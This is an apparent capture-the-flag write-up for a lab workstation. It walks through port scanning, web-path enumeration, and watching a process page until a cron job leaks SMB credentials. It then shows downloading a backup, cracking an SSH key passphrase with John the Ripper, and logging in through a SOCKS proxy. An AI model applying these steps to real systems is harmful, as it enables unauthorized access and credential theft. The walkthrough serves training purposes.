# Admin John (5 points)

Hi, TCC-CSIRT analyst,

please check if any inappropriate services are running on the workstation
`john.admins.cypherfix.tcc`. We know that this workstation belongs to an
administrator who likes to experiment on his own machine.

See you in the next incident!

## Solution

We'll start, as usually, by exploring what is listening on the workstation.

```console
$ nmap -p - john.admins.cypherfix.tcc
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-26 11:48 Central Europe Daylight Time
Nmap scan report for john.admins.cypherfix.tcc (10.99.24.101)
Host is up (0.035s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
23000/tcp open  inovaport1

Nmap done: 1 IP address (1 host up) scanned in 17.11 seconds
```

If we open the website on port 80, we'll see `Hello world in PHP.` message.
This is a good hint so let's use PHP-specific list (fom `seclists`) to discover
interesting endpoints/locations on the server.

```console
$ dirb http://john.admins.cypherfix.tcc /usr/share/wordlists/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Oct 26 11:52:20 2024
URL_BASE: http://john.admins.cypherfix.tcc/
WORDLIST_FILES: /usr/share/wordlists/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt

-----------------

GENERATED WORDS: 5163

---- Scanning URL: http://john.admins.cypherfix.tcc/ ----
+ http://john.admins.cypherfix.tcc/index.php (CODE:200|SIZE:28)
+ http://john.admins.cypherfix.tcc/environment.php (CODE:200|SIZE:3179)

-----------------
END_TIME: Sat Oct 26 11:53:10 2024
DOWNLOADED: 5163 - FOUND: 2
```

We have discovered `environment.php` which seems to list running processes.

```console
$ curl http://john.admins.cypherfix.tcc/environment.php
<h2>Environment Variables</h2>Linux 3c829efad07d 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64 GNU/Linux<br />
<h2>Disk usage</h2>Filesystem      Size  Used Avail Use% Mounted on<br />
overlay          98G   34G   61G  36% /<br />
tmpfs            64M     0   64M   0% /dev<br />
shm              64M     0   64M   0% /dev/shm<br />
/dev/sda2        98G   34G   61G  36% /etc/hosts<br />
tmpfs           3.9G     0  3.9G   0% /proc/acpi<br />
tmpfs           3.9G     0  3.9G   0% /sys/firmware<br />
<h2>Running Processes</h2>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br />
root           1  0.0  0.0   3924  2712 ?        Ss   Oct14   0:00 /bin/bash /entrypoint.sh<br />
root          62  0.0  0.2  37096 18664 ?        S    Oct14   6:36 /usr/bin/python3 /usr/bin/supervisord<br />
root          63  0.0  0.0   2576   792 ?        S    Oct14   0:00  \_ /bin/sh /usr/sbin/apachectl -D FOREGROUND<br />
root          69  0.0  0.1 201060 11652 ?        S    Oct14   1:01  |   \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738381  0.0  0.1 201656 14676 ?        S    Oct25   0:03  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738452  0.0  0.1 201656 14676 ?        S    Oct25   0:03  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738463  0.0  0.1 201656 14668 ?        S    Oct25   0:03  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738482  0.0  0.1 201656 14676 ?        S    Oct25   0:02  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738654  0.0  0.1 201688 14676 ?        S    Oct25   0:02  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738678  0.0  0.1 201656 14676 ?        S    Oct25   0:01  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738724  0.0  0.1 201656 14816 ?        S    Oct25   0:01  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738736  0.0  0.1 201656 14676 ?        S    Oct25   0:01  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738737  0.0  0.1 201656 14672 ?        S    Oct25   0:01  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738743  0.0  0.1 201656 14676 ?        S    Oct25   0:01  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
root          64  0.0  0.0   3976  2144 ?        S    Oct14   0:08  \_ cron -f<br />
root      764492  0.0  0.0   5868  2616 ?        S    09:53   0:00  |   \_ CRON -f<br />
root      764493  0.0  0.0   2576   892 ?        Ss   09:53   0:00  |       \_ /bin/sh -c /bin/ps faxu > /backup/ps.txt                                                           <br />
root      764494  0.0  0.0   8100  4012 ?        R    09:53   0:00  |           \_ /bin/ps faxu<br />
root          65  0.0  0.0  15432  4720 ?        S    Oct14   0:47  \_ sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups<br />
john@tc+      66  0.0  0.0   2464   824 ?        S    Oct14   0:00  \_ sshpass -p xxxxxxxxxxxxxxxxxxxx ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100<br />
john@tc+      67  0.1  0.4  45112 37440 pts/0    Ss+  Oct14  19:13      \_ ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100<br />
```

We can see that the open port `23000` is actually a tunnel (SOCKS proxy) to
`10.99.24.100`, however, apart from this, there's nothing suspicious there.
(Unless someone was extremely lucky)

Let's try to monitor this file, e.g. using the following script

```shell
URL="http://john.admins.cypherfix.tcc/environment.php"
TMP_FILENAME="response.txt"
LAST_CHECKSUM=""
while true; do
    curl -s $URL -o $TMP_FILENAME
    RESPONSE_CHECKSUM=$(md5sum "$TMP_FILENAME")
    if [ "$RESPONSE_CHECKSUM" != "$LAST_CHECKSUM" ]; then
        echo "!!! Response changed !!!"
            LAST_CHECKSUM="$RESPONSE_CHECKSUM"
            cat $TMP_FILENAME
        mv $TMP_FILENAME "response-$(date '+%s').txt"
    fi
done
```

After a while we come across the following response

```
<h2>Environment Variables</h2>Linux 3c829efad07d 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64 GNU/Linux<br />
<h2>Disk usage</h2>Filesystem      Size  Used Avail Use% Mounted on<br />
overlay          98G   34G   61G  36% /<br />
tmpfs            64M     0   64M   0% /dev<br />
shm              64M     0   64M   0% /dev/shm<br />
/dev/sda2        98G   34G   61G  36% /etc/hosts<br />
tmpfs           3.9G     0  3.9G   0% /proc/acpi<br />
tmpfs           3.9G     0  3.9G   0% /sys/firmware<br />
<h2>Running Processes</h2>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br />
root           1  0.0  0.0   3924  2712 ?        Ss   Oct14   0:00 /bin/bash /entrypoint.sh<br />
root          62  0.0  0.2  37096 18664 ?        S    Oct14   6:36 /usr/bin/python3 /usr/bin/supervisord<br />
root          63  0.0  0.0   2576   792 ?        S    Oct14   0:00  \_ /bin/sh /usr/sbin/apachectl -D FOREGROUND<br />
root          69  0.0  0.1 201060 11652 ?        S    Oct14   1:02  |   \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738381  0.0  0.1 201656 14824 ?        S    Oct25   0:04  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738452  0.0  0.1 201656 14824 ?        S    Oct25   0:03  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738463  0.0  0.1 201656 14820 ?        S    Oct25   0:03  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738482  0.0  0.1 201656 14828 ?        S    Oct25   0:03  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738654  0.0  0.1 201688 14856 ?        S    Oct25   0:02  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738678  0.0  0.1 201656 14820 ?        S    Oct25   0:02  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738724  0.0  0.1 201656 14824 ?        S    Oct25   0:01  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738736  0.0  0.1 201656 14820 ?        S    Oct25   0:01  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738737  0.0  0.1 201656 14820 ?        S    Oct25   0:01  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  738743  0.0  0.1 201656 14824 ?        S    Oct25   0:01  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
root          64  0.0  0.0   3976  2144 ?        S    Oct14   0:08  \_ cron -f<br />
root      774110  0.0  0.0   5868  2616 ?        S    10:10   0:00  |   \_ CRON -f<br />
root      774115  0.0  0.0   2576   924 ?        Ss   10:10   0:00  |       \_ /bin/sh -c read -t 2.0; /bin/bash /opt/client/backup.sh<br />
root      774119  0.0  0.0   3924  2748 ?        S    10:10   0:00  |           \_ /bin/bash /opt/client/backup.sh<br />
root      774196  0.0  0.0  23036  3568 ?        R    10:10   0:00  |               \_ smbclient -U backuper%Bprn5ibLF4KNS4GR5dt4 //10.99.24.100/backup -c put /backup/backup-1729937401.tgz backup-home.tgz<br />
root      774197  0.0  0.0   8100  3932 ?        R    10:10   0:00  |               \_ ps faxu<br />
root          65  0.0  0.0  15432  4720 ?        S    Oct14   0:47  \_ sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups<br />
john@tc+      66  0.0  0.0   2464   824 ?        S    Oct14   0:00  \_ sshpass -p xxxxxxxxxxxxxxxxxxxx ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100<br />
john@tc+      67  0.1  0.4  45112 37440 pts/0    Ss+  Oct14  19:13      \_ ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100<br />
```

Now we can see that some backup is being published to `//10.99.24.100/backup`
using username of `backuper` and the password `Bprn5ibLF4KNS4GR5dt4`. The scan
shows that the host is accessible and has SMB ports open.

```console
$ nmap -p - 10.99.24.100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 12:28 CEST
Nmap scan report for 10.99.24.100
Host is up (0.011s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 21.10 seconds
```

Therefore we can directly retrieve the backup.

```console
$ smbclient -U backuper%Bprn5ibLF4KNS4GR5dt4 //10.99.24.100/backup -c "get backup-home.tgz"
getting file \backup-home.tgz of size 5830741 as backup-home.tgz (7832.3 KiloBytes/sec) (average 7832.3 KiloBytes/sec)
```

After we extract the backup and explore the content, we can find the user's
private key in `john@tcc.local/.ssh/id_rsa`. In addition to that, the
`authorized_keys` in the same directory indicates, that login using this key is
only allowed from `10.99.24.100`. At the same time, the information that we
already have shows that the port `23000` offers a SOCKS proxy, that ends on
`10.99.24.100`, so we can use it to connect.

```console
$ ssh -o "ProxyCommand=nc -x 10.99.24.101:23000 %h %p" -i "john@tcc.local/.ssh/id_rsa" -l "john@tcc.local" 10.99.24.101
Enter passphrase for key 'john@tcc.local/.ssh/id_rsa':
```

The private key that we retrieved is encrypted and we need to retrieve its
password first. After carefully exploring `.bash_history` in the extracted home
directory backup, we come across the following lines.

```
ssh -i ~/.ssh/id_rsa root@esx1.tcc.local
Enterprise1512
ssh-keygen -p -f ~/.ssh/id_rsa
```

It seems like the user used the `id_rsa` key to log in to another host,
accidentally typed the password into console and immediately changed it
afterwards. With this information, we can try to use John the Ripper to
crack the password, assuming that the user used a similar password and
just changed the digits.

```console
$ ssh2john "john@tcc.local/.ssh/id_rsa" > id_rsa.txt
$ john --mask=Enterprise?d?d?d?d id_rsa.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Enterprise2215   (john@tcc.local/.ssh/id_rsa)
1g 0:00:00:00 DONE (2024-10-26 13:00) 33.33g/s 201600p/s 201600c/s 201600C/s Enterprise5015..Enterprise4915
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The output shows that the correct password for the key is `Enterprise2215`.
Equipped with the correct passowrd, we can now successfully retrieve the flag.

```console
$ ssh -o "ProxyCommand=nc -x 10.99.24.101:23000 %h %p" -i "john@tcc.local/.ssh/id_rsa" -l "john@tcc.local" 10.99.24.101
Enter passphrase for key 'john@tcc.local/.ssh/id_rsa':
FLAG{sIej-5d9a-aIbh-v4qH}
Connection to 10.99.24.101 closed.
```
